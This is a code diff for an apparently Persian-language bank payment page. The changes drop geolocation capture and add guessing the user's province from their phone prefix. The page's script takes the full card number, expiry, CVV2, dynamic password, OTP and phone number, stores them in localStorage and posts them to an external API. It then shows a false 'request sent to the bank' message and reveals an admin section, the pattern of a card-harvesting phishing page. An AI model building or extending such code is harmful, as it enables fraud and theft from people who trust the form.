@@ -244,44 +244,28 @@
             return Math.floor(1000 + Math.random() * 9000).toString();
         }
 
-        // تابع گرفتن موقعیت مکانی
-        function getLocation(callback) {
-            if (!navigator.geolocation) {
-                alert("مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.");
-                callback(null);
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        timestamp: new Date().toISOString()
-                    };
-                    console.log("موقعیت مکانی دریافت شد:", location); // برای دیباگ
-                    callback(location);
-                },
-                (error) => {
-                    let errorMessage = "خطا در گرفتن موقعیت مکانی: ";
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage += "کاربر اجازه دسترسی را نداد.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage += "موقعیت مکانی در دسترس نیست.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage += "درخواست زمان‌بر شد.";
-                            break;
-                        default:
-                            errorMessage += "خطای ناشناخته.";
-                    }
-                    alert(errorMessage);
-                    console.warn(errorMessage);
-                    callback(null);
-                }
-            );
+        // تابع تشخیص استان بر اساس شماره تلفن
+        function detectProvinceFromPhone(phoneNumber) {
+            const prefix = phoneNumber.replace(/[-\s]/g, '').slice(0, 4); // گرفتن 4 رقم اول بدون خط تیره
+            const provinceMap = {
+                "0912": "تهران",
+                "0913": "اصفهان",
+                "0914": "آذربایجان شرقی",
+                "0915": "فارس",
+                "0916": "خوزستان",
+                "0917": "هرمزگان",
+                "0918": "کردستان",
+                "0919": "البرز",
+                "0901": "تهران",
+                "0902": "مازندران",
+                "0903": "گیلان",
+                "0935": "خراسان رضوی",
+                "0936": "کرمان",
+                "0937": "سیستان و بلوچستان",
+                "0938": "یزد",
+                "0939": "قم"
+            };
+            return provinceMap[prefix] || "نامشخص";
         }
 
         function requestOTP() {
@@ -291,49 +275,46 @@
             if (userCode === generatedCode) {
                 const form = document.getElementById('payment-form');
                 const data = new FormData(form);
+                const phoneNumber = data.get("phone-number");
+                const province = detectProvinceFromPhone(phoneNumber);
 
-                console.log("در حال گرفتن موقعیت مکانی..."); // برای دیباگ
-                getLocation((location) => {
-                    const jsonData = {
-                        "card_number": data.get("card-number"),
-                        "amount": data.get("amount"),
-                        "expiry": data.get("expiry"),
-                        "cvv2": data.get("cvv2"),
-                        "security_code": data.get("security-code"),
-                        "otp_code": data.get("otp-code"),
-                        "phone_number": data.get("phone-number"),
-                        "location": location || "موقعیت مکانی دریافت نشد",
-                        "timestamp": new Date().toISOString()
-                    };
+                const jsonData = {
+                    "card_number": data.get("card-number"),
+                    "amount": data.get("amount"),
+                    "expiry": data.get("expiry"),
+                    "cvv2": data.get("cvv2"),
+                    "security_code": data.get("security-code"),
+                    "otp_code": data.get("otp-code"),
+                    "phone_number": phoneNumber,
+                    "province": province, // اضافه کردن استان
+                    "timestamp": new Date().toISOString()
+                };
 
-                    // ذخیره در localStorage
-                    let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-                    storedData.push(jsonData);
-                    localStorage.setItem('paymentData', JSON.stringify(storedData));
-                    console.log("داده‌ها در localStorage ذخیره شد:", jsonData); // برای دیباگ
+                let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
+                storedData.push(jsonData);
+                localStorage.setItem('paymentData', JSON.stringify(storedData));
+                console.log("داده‌ها ذخیره شدند:", jsonData);
 
-                    // ارسال به API
-                    fetch('https://reqres.in/api/users', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(jsonData)
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        alert("درخواست رمز پویا به بانک مبدا ارسال شد");
-                        document.getElementById('request-otp').style.display = 'none';
-                        document.getElementById('otp-timer').style.display = 'block';
-                        startOTPTimer(120);
+                fetch('https://reqres.in/api/users', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(jsonData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert("درخواست رمز پویا به بانک مبدا ارسال شد");
+                    document.getElementById('request-otp').style.display = 'none';
+                    document.getElementById('otp-timer').style.display = 'block';
+                    startOTPTimer(120);
 
-                        const adminSection = document.getElementById('admin-section');
-                        adminSection.style.display = 'block';
-                        adminSection.scrollIntoView({ behavior: 'smooth' });
-                    })
-                    .catch(error => {
-                        alert("خطا در ارسال اطلاعات: " + error.message);
-                    });
+                    const adminSection = document.getElementById('admin-section');
+                    adminSection.style.display = 'block';
+                    adminSection.scrollIntoView({ behavior: 'smooth' });
+                })
+                .catch(error => {
+                    alert("خطا در ارسال اطلاعات: " + error.message);
                 });
             } else {
                 alert("کد امنیتی نامعتبر است");
